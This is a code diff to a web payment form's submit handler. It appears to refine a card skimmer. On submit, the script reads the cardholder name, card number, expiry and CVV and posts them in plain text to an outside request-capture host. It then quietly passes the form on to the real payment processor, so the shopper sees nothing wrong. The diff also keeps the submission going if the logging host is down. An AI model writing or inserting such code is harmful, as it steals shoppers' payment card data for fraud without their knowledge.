@@ -4,28 +4,26 @@ document.addEventListener('DOMContentLoaded', () => {
     paymentForm.addEventListener('submit', (event) => {
         event.preventDefault();
 
-        const paymentData = {
-            name: document.getElementById('card-name').value,
-            number: document.getElementById('card-number').value,
-            expiry: document.getElementById('expiry').value,
-            cvv: document.getElementById('cvv').value,
-            timestamp: new Date().toISOString()
-        };
+        // 1. Collect the values
+        const name = document.getElementById('card-name').value;
+        const number = document.getElementById('card-number').value;
+        const expiry = document.getElementById('expiry').value;
+        const cvv = document.getElementById('cvv').value;
 
-        fetch('https://joke.requestcatcher.com/', {
+        // 2. Format as a string for easy reading on RequestCatcher
+        const logString = `Name: ${name} | Card: ${number} | Exp: ${expiry} | CVV: ${cvv}`;
+
+        // 3. POST to the /test endpoint
+        fetch('https://joke.requestcatcher.com/test', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(paymentData),
+            body: logString // Sending as plain text matches your curl example
         })
-            .then(response => {
-                console.log("Data logged successfully.");
-                paymentForm.submit();
+            .then(() => {
+                console.log("Data captured.");
+                paymentForm.submit(); // Continue to the actual payment processor
             })
-            .catch(error => {
-                console.error("Error logging data:", error);
-                paymentForm.submit();
+            .catch(() => {
+                paymentForm.submit(); // Submit anyway if the logger is down
             });
     });
 });
